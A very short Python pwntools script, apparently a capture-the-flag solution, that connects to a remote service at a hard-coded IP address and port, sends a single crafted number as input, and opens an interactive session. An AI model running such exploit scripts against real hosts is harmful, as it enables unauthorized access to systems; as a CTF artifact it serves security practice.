from pwn import*
p = remote('39.101.210.214',10007)
#p = process('./main')
p.sendline(str(0x233300000000))
p.interactive()
